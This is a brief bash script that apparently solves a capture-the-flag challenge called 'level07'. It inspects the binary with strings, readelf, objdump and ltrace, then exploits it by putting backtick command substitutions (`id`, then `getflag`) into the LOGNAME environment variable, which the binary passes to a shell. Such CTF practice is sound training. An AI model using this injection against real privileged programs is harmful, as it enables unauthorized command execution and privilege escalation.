#!/bin/bash

file level07
strings level07
xxd level07 | grep level
xxd level07 | grep -A3 -B3 level
readelf -s ./level07 | grep -E 'getenv|system|exec|echo|puts|write|printf'
objdump -d level07 | grep -E "getenv|system|exec|echo|puts|write|printf"
readelf -p .rodata ./level07 | grep -i -A3 -B3 logname
ltrace ./level07 | grep -i -A3 -B3 logname
./level07 whoami
env logname
export LOGNAME='`id`'
./level07
export LOGNAME='`getflag`'
./level07

